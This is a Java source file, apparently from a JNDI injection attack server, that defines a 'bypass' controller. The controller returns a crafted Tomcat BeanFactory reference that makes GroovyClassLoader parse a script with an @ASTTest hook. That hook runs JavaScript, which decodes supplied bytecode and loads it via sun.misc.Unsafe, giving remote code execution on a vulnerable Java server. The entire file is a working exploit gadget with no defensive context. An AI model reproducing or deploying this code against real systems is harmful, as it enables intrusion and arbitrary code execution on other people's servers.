package map.jndi.controller.bypass;

import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.controller.BasicController;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Base64;

@JNDIController
@JNDIMapping("/GroovyClassLoader")
public class GroovyClassLoaderController extends BasicController {
    @Override
    public Object process(byte[] byteCode) {
        System.out.println("[Reference] Factory: BeanFactory + GroovyClassLoader");

        String code = "var s = '" + Base64.getEncoder().encodeToString(byteCode) + "';" +
                "var bt;" +
                "try {" +
                "bt = java.lang.Class.forName('sun.misc.BASE64Decoder').newInstance().decodeBuffer(s);" +
                "} catch (e) {" +
                "bt = java.util.Base64.getDecoder().decode(s);" +
                "}" +
                "var theUnsafeField = java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');" +
                "theUnsafeField.setAccessible(true);" +
                "unsafe = theUnsafeField.get(null);" +
                "unsafe.defineAnonymousClass(java.lang.Class.forName('java.lang.Class'), bt, null).newInstance();";

        String script = "@groovy.transform.ASTTest(value={\n" +
                "    assert Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\")\n" +
                "})\n" +
                "class Person {\n" +
                "}";

        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=parseClass"));
        ref.add(new StringRefAddr("x", script));
        return ref;
    }
}
